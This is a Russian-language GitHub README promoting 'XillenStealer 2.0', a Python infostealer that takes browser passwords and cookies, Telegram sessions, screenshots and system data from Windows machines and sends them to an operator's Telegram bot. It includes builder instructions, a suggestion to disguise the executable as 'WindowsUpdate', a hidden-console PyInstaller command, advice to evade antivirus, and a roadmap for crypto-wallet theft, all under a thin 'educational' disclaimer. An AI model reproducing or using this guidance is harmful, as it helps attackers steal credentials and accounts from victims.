

<p align="center">
  <img src="https://github.com/user-attachments/assets/0d44e62b-ba43-4e77-8424-5be3ec684b51" alt="XillenStealer 2.0" width="800">
</p>

<div align="center">
  
[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-0078D6?logo=windows)](https://www.microsoft.com/windows)
[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)](https://python.org)
[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?logo=telegram&logoColor=white)](https://telegram.org)
[![License](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)

**Мощный Python-стиллер нового поколения с автоматической отправкой данных через Telegram**



</div>



## 🔥 Особенности XillenStealer 2.0

| Функция | Описание | Статус |
|---------|----------|--------|
| **🕵️‍♂️ Сбор данных** | Полная информация о системе, браузерах и активности | ✅ Работает |
| **🤖 Telegram интеграция** | Автоматическая отправка данных через бота | ✅ Работает |
| **🔐 Шифрование** | Расшифровка паролей браузеров | ✅ Работает |
| **📸 Скриншот** | Захват текущего экрана | ✅ Работает |
| **🛡️ Автоправа** | Автоматический запуск с правами администратора | ✅ Работает |
| **📦 Автоустановка** | Автоматическая установка зависимостей | ✅ Работает |

## 💾 Поддерживаемые браузеры

| Браузер | Куки | Пароли |
|---------|------|--------|
| **Chrome** | ✅ | ✅ |
| **Firefox** | ✅ | ✅ |
| **Opera** | ✅ | ✅ |
| **Opera GX** | ✅ | ✅ |
| **Amigo** | ✅ | ✅ |
| **Edge** | ✅ | ✅ |

## 📸 Скриншоты работы

<p align="center">
  <img src="https://github.com/user-attachments/assets/91d13f16-a4ed-4cb2-9aeb-319a23d6edab" width="45%" alt="Интерфейс билдера">
  <img src="https://github.com/user-attachments/assets/0662eb8f-2d75-4690-af28-c99fdf47bf65" width="45%" alt="Пример данных">
</p>

## ⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ
```diff
- ПРОЕКТ СОЗДАН ИСКЛЮЧИТЕЛЬНО В УЧЕБНЫХ ЦЕЛЯХ!
- АВТОР НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ ЗА НЕПРАВОМЕРНОЕ ИСПОЛЬЗОВАНИЕ!

## ⚙️ Быстрый старт

### 📦 Предварительные требования
```bash
# Основные зависимости:
pip install pywin32 browser_cookie3 pillow requests 
pip install pycryptodome psutil gputil pytelegrambotapi

# Для графического билдера:
pip install tkinter

# Для компиляции в EXE:
pip install pyinstaller

🔑 Запуск билдера


1. Распакуйте архив с проектом
2. Запустите билдер:
   python builder.py
3. Введите пароль: layscrab

🛠️ Создание стиллера (GUI)


1. Выберите "Создать стиллер"
2. Заполните параметры:
   - Имя стиллера (пример: WindowsUpdate)
   - Токен бота (получить у @BotFather)
   - ID чата (узнать через @userinfobot)
3. Нажмите "Создать"
4. Выберите "Да" при запросе "Собрать в EXE?"
5. Готовый файл: youstill/Ваше_Имя_Стиллера.exe

⚡ Ручная компиляция (для продвинутых)

pyinstaller --onefile --noconsole \
    --collect-data tkinter \
    --hidden-import=telebot,psutil,GPUtil,browser_cookie3 \
    --name "YourStealerName" \
    steler.py

🔍 Что собирает стиллер


- 🖥️ **Системная информация:**
  - Характеристики CPU/GPU/RAM
  - Диски и установленные программы
  - Сетевые подключения и IP/MAC адреса
  
- 🔐 **Данные браузеров:**
  - Пароли и куки (Chrome, Firefox, Opera, Edge и др.)
  - История автозаполнения форм
  
- 📱 **Telegram данные:**
  - Сессия tdata (при наличии)
  
- 🖼️ **Скриншот экрана**
  
- 🌐 **Сетевая информация:**
  - Локальный и внешний IP
  - MAC-адрес
  - Активные соединения

📌 Важные примечания

    Антивирусы могут блокировать выполнение - добавьте в исключения

    Для Telegram сессий нужен установленный официальный клиент

    Стиллер требует прав администратора для полного доступа

    Все зависимости устанавливаются автоматически при первом запуске

    Проект создан только для образовательных целей

🌟 Roadmap 2024

    Поддержка Linux/MacOS

    Сбор данных Discord

    Автосбор криптокошельков

    Интеграция с Discord Webhooks

    Графическая панель управления

    Поддержка Vault браузеров

👥 Авторы

    @XillenAdapter - Clan

    @LeshaCoder - Owner and Idea

    @BengaminButton - Chief Coder

<div align="center"> <strong>⚠️ ВНИМАНИЕ: Проект создан исключительно в образовательных целях! Авторы не несут ответсвенность за ваши действия!.</strong> </div> ```
